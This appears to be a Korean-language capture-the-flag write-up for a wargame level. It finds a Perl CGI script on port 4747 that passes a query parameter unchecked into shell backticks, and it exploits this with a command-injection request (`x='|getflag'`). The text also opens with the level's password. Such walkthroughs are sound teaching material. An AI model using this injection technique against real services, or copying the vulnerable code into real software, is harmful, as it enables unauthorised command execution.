> Password: qi0maab88jeaj46qoumi7maus

# 접근 방법

홈 디렉토리에 `level04.pl` 파일이 있다.
```
$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
[...]
```
하지만 CGI 형태로 동작하게 되어 있기 때문에, 직접 pl을 실행하기는 어려워 보인다. 하지만 주석에 `localhost:4747` 이라는 내용이 있는 것으로, 현재 4747번 포트에서 해당 파일을 서빙하고 있을지 모른다는 힌트를 얻을 수 있다.

```
$ netstat -antp tcp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
[...]
tcp6       0      0 :::4747                 :::*                    LISTEN      -
[...]
```
실제로 4747번 포트에서 서빙중인 것을 확인할 수 있다.

```
$ curl -v localhost:4747
* About to connect() to localhost port 4747 (#0)
*   Trying 127.0.0.1... connected
> GET / HTTP/1.1
> User-Agent: curl/7.22.0 (i686-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3
> Host: localhost:4747
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Thu, 27 Oct 2022 18:13:12 GMT
< Server: Apache/2.2.22 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 1
< Content-Type: text/html
<

* Connection #0 to host localhost left intact
* Closing connection #0
```

이후, `curl` 명령으로 해당 포트에 연결을 시도해보면 HTTP응답이 오는 것을 확인할 수 있다. 그리고 응답 헤더 중 `Server` 필드의 내용을 통해서 `Apache/2.2.22`로 서빙되고 있음을 알 수 있다.

따라서 현재 서버의 apache2 설정을 확인해본다.

```
$ cd /etc/apache2/sites-enabled/
$ ls
000-default  level05.conf  level12.conf
$ cat level05.conf
<VirtualHost *:4747>
	DocumentRoot	/var/www/level04/
	SuexecUserGroup flag04 level04
	<Directory /var/www/level04>
		Options +ExecCGI
		DirectoryIndex level04.pl
		AllowOverride None
		Order allow,deny
		Allow from all
		AddHandler cgi-script .pl
	</Directory>
</VirtualHost>
```

apache2의 설정을 확인해보면, `/var/www/level04/level04.pl` 경로의 파일을 인덱스로 해서 서빙하고 있다. 그리고, `+ExecCGI` 옵션을 통해 CGI실행을 하고 있음 및 `SuexecUserGroup` 설정을 통해 `flag04` 권한으로 실행됨을 확인할 수 있다.

```
$ cat /var/www/level04/level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
[...]
```

해당 경로의 `level04.pl` 역시, 홈 디렉토리의 그것과 완전히 동일한 내용임을 확인했다.

이제 `level04.pl` 파일의 내용을 분석해보자.

```perl
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

쿼리 파라미터 `x`를 받아서 그 내용을 특별한 확인 없이 \`\`(backtick)에 그대로 넣는 것을 볼 수 있는데, `perl`의 백틱은 그 내용을 쉘에 넣어서 실행(Evaluate)하는 문법이다. 따라서 `x`의 값으로 `|getflag`과 같은 내용을 넣음으로써 임의의 명령어를 실행하는 방식을 통해, `flag04`의 권한으로 실행된 `getflag`를 통해 원하는 `token`을 얻을 수 있다.

```bash
> curl localhost:4747?x='|getflag'
```